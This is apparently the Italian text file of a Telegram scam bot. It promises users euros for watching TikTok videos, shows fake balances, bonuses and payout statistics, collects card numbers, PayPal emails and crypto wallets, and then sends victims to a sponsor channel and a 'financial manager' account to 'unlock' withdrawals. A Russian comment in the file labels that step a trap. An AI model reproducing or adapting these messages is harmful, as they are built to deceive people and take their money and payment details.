LEXICON = {
    # --- СТАРТ И ПРИВЕТСТВИЕ ---
    'welcome_msg': (
        "👋 <b>Ciao, {name}!</b>\n\n"
        "🔥 Colleghiamo i creatori di contenuti TikTok con i nostri utenti. "
        "Guadagna denaro aumentando la loro popolarità.\n\n"
        "👀 Per ogni visualizzazione su TikTok, ti paghiamo <b>fino a 2€</b>\n\n"
        "☑️ Clicca su <b>\"Sono informato\"</b> per iniziare a guadagnare subito."
    ),
    'btn_informed': "✅ Sono informato",

    # --- ЗАДАНИЯ (ВИДЕО) ---
    'video_task': (
        "✅ <b>Visualizzazione registrata</b>\n"
        "✳️ <b>Premio: +{reward} €</b>\n"
        "✅ <b>Completato: {current} di 15</b>\n\n"
        "💰 <b>Il tuo saldo: {balance} €</b>\n\n"
        "👇 <b>AZIONE RICHIESTA:</b>\n{task_text}"
    ),
    'task_like_dislike': {
        'text': "Scegli un'opzione usando i pulsanti qui sotto:"
    },
    'task_comment': {
        'text': "✍️ <b>Scrivi un commento</b> (minimo 15 caratteri) inviandolo direttamente in questa chat per ricevere i fondi."
    },
    'alert_too_fast': "⚠️ Non hai guardato il video fino alla fine!",
    'btn_finish': "🏁 Termina sessione",
    'finish_task': (
        "🎉 <b>Lavoro completato!</b>\n\n"
        "Hai guardato tutti i 15 video e hai guadagnato <b>{balance} €</b>!\n"
        "🎁 Inoltre, ti abbiamo accreditato un BONUS di benvenuto di <b>20 €</b>.\n\n"
        "💳 <b>Saldo totale disponibile per il prelievo: {total} €</b>"
    ),
    'limit_reached': (
        "⚠️ <b>Limite giornaliero raggiunto!</b>\n\n"
        "Hai completato tutti i compiti per oggi. Torna domani per nuovi video o preleva i tuoi guadagni nel profilo."
    ),


    'ask_binance': "✍️ <b>Binance Pay</b>\n\nInserisci l'indirizzo del tuo portafoglio USDT (TRC20/BEP20) o il tuo Binance ID:",
    'ask_paypal': "✍️ <b>PayPal</b>\n\nInserisci l'indirizzo email associato al tuo conto PayPal:",
    'ask_card': "✍️ <b>Carta Bancaria</b>\n\nInserisci il numero della tua carta (16 cifre):",

    'invalid_details': "❌ <b>Errore!</b>\nI dati inseriti non sembrano validi. Inserisci un numero corretto:",
    'processing_1': "⏳ <i>Connessione al gateway di pagamento in corso...</i>",
    'processing_2': "🔄 <i>Verifica dei dati e della disponibilità dei fondi...</i>",

    # --- ЛОВУШКА И ПОДПИСКА ---
    'withdraw_trap': (
        "✅ <b>Richiesta di prelievo approvata!</b>\n\n"
        "💳 Dettagli: <code>{details}</code>\n"
        "💰 Importo: <b>{balance} €</b>\n\n"
        "Per sbloccare il bonifico e ricevere i fondi, segui questi 2 semplici passaggi:\n\n"
        "1️⃣ <b>Iscriviti al canale del nostro sponsor:</b>\n"
        "👉 <a href='https://t.me/+06DdEkcYVHtmYTIy'>LINK AL CANALE</a>\n\n"
        "2️⃣ <b>Scrivi al nostro manager finanziario</b> confermando i tuoi dati:\n"
        "👉 <a href='https://t.me/monica_guadagno'>@monica_guadagno</a>\n\n"
        "⏳ <i>I fondi verranno inviati entro 15 minuti dalla verifica del manager.</i>"
    ),
    'sub_required_text': "❌ <b>Accesso negato!</b>\n\nNon sei ancora iscritto al nostro canale ufficiale. Iscriviti per poter prelevare i fondi!",
    'btn_subscribe': "📢 Iscriviti al Canale",
    'btn_check_sub_now': "🔄 Verifica Iscrizione",
    'sub_success': "✅ <b>Ottimo!</b> La tua iscrizione è stata confermata. Ora puoi contattare il manager.",

    # --- БАЗА ВИДЕО ---
    'videos': [
        'BAACAgIAAxkBAAMJajHivVgqtol0VF435BnCRVR2NwUAAoOZAAKEc5BJp_pifLoWD8A8BA',
        'BAACAgIAAxkBAAMLajHiwqjBNtMcatu7H_HCX2WqFpUAAoSZAAKEc5BJF08z3g6o1YE8BA',
        'BAACAgIAAxkBAAMNajHixkauhb390w7SLp0Zom43Q6MAAoWZAAKEc5BJkWS7i625cfE8BA',
        'BAACAgIAAxkBAAMPajHiykX1noqUWn4iqpFqmce6y_MAAoaZAAKEc5BJGAkddVKioVk8BA',
        'BAACAgIAAxkBAAMRajHizrNiW9XoLZje88ROM0OeyrYAAoeZAAKEc5BJ7tG4Tdp8soY8BA',
        'BAACAgIAAxkBAAMTajHi0n27_uhkyPKLkARuFCqMNJQAAoiZAAKEc5BJHJZHhsfm2-E8BA',
        'BAACAgIAAxkBAAMVajHi11sJZEfbDZ6dE0O1aKaiVRoAAomZAAKEc5BJGwh62gF8XAg8BA',
        'BAACAgIAAxkBAAMXajHi2jU5qXg8vt4FNyI3AQ_gVFcAAoqZAAKEc5BJYT8oZV4Mh5g8BA',
        'BAACAgIAAxkBAAMZajHi33JDWKJchwlCiMu7NV2ROjkAAouZAAKEc5BJdCJNhG6x-T08BA',
        'BAACAgIAAxkBAAMbajHi4ysWlhfvI-pKchFJnWtPkK8AAoyZAAKEc5BJu025M9WWkA08BA',
        'BAACAgIAAxkBAAMdajHi5xsBLoOsCTLNzNNTd6FOo-UAAo2ZAAKEc5BJn8I863q6D1I8BA',
        'BAACAgIAAxkBAAMfajHi6yt-mavwam7tMw1tdAvJIaEAAo6ZAAKEc5BJ5Qa8cCXCyyk8BA',
        'BAACAgIAAxkBAAMjajHi9FdhqD2spnRudPDjxSaI2M4AApCZAAKEc5BJ-OZQlqBy_NI8BA',
        'BAACAgIAAxkBAAMlajHi9657A_yT8EMpZAPRTQ4FdWUAApGZAAKEc5BJl2Ux4XeS7cc8BA',
        'BAACAgEAAxkBAANKajMkvD4DBQqU8as-3ef9PGPDhdwAAlIIAAKhB5lFEN5a78-qEH88BA'
    ],
# --- ГЛАВНОЕ МЕНЮ (Как на скрине 3 и 4) ---
    'main_menu_text': "Scegli l'opzione dal menù ⤵️",
    'btn_earn': "🎵 Guadagna",
    'btn_profile': "👤 Profilo",
    'btn_withdraw': "💰 Prelievo",
    'btn_partners': "👥 Partner",
    'btn_back': "🔙 Indietro",

    # --- ПРОФИЛЬ (Как на скрине 5) ---
    'profile_text': (
        "👤 <b>I tuoi risultati!</b>\n\n"
        "Nome: <b>{name}</b>\n"
        "Nome utente: <b>@{username}</b>\n"
        "Status: ✅ Verificato\n"
        "Saldo: <b>{balance} €</b>\n"
        "Visualizzazioni: <b>{video_count}</b>\n"
        "Amici invitati: <b>0</b>\n\n"
        "Iată ce am realizat 🥇\n" # Оставил легкий шарм, но дальше перевел
        "Statistiche per oggi:\n"
        "👶 Partecipanti: 123.853 persone.\n"
        "💶 Somma pagata: 20.140.642 €.\n"
        "🎥 Visualizzazioni totali: 530.016 videoclipuri.\n\n"
        "⏱ <i>Prossimo aggiornamento in 24 ore...</i>"
    ),

    # --- ВЫВОД СРЕДСТВ (Как на скрине 7) ---
    'withdraw_text': (
        "💰 Saldo: <b>{balance} €</b>\n"
        "Vuoi prelevare i fondi?\n\n"
        "O, prima di farlo, puoi guadagnare:\n"
        "💰 +25 € con l'azione „Invita amici”.\n"
        "💶 +10 € guardando i video e aiutando i blogger.\n"
        "🤑 a partire da 50 € - bonus del programma di affiliazione."
    ),
    'btn_phone': "📱 Telefono",
    'btn_paypal': "🅿️ PayPal",
    'btn_binance': "🔶 Binance",
    'btn_card': "💳 Carta",

    # --- ВВОД РЕКВИЗИТОВ (Как на скрине 8) ---
    'ask_wallet_generic': (
        "💳 <b>Inserisci i tuoi dati per il trasferimento.</b>\n"
        "Banche - Revolut, Raiffeisen, Wise, Intesa, UniCredit\n\n"
        "🔒 <i>La sicurezza delle transazioni è la nostra priorità principale. Gli utenti soddisfatti sono la migliore raccomandazione per il bot di TikTok.</i>"
    ),
    # --- РАЗДЕЛ ПАРТНЕРЫ (ОДИН КАНАЛ) ---
    'partners_text': (
        "🤝 <b>Il nostro Partner Ufficiale</b>\n\n"
        "Unisciti al canale del nostro partner per non perdere bonus esclusivi, "
        "nuovi modi per guadagnare e prove di pagamento giornaliere!\n\n"
        "👇 <i>Clicca qui sotto per iscriverti:</i>"
    ),
    'btn_partner_channel': "📢 Canale Ufficiale",
}